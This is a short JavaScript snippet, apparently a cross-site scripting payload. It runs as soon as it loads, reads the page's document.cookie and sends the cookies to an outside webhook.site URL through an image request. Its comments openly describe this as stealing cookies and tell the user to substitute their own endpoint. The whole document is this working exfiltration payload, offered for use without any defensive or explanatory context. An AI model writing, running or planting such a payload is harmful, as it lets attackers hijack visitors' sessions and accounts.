(function() {
    // Function to steal cookies
    function stealCookies() {
        var cookie = document.cookie; // Get the document cookies
        var image = new Image(); // Create a new Image object to send a request

        // Send the cookie to your server (replace with your own endpoint)
        image.src = 'https://webhook.site/1e59a9c8-2eb5-4c95-8bf0-fd1fd36f50a2/?c=' + encodeURIComponent(cookie);
    }

    // Call the function to steal cookies
    stealCookies();
})();
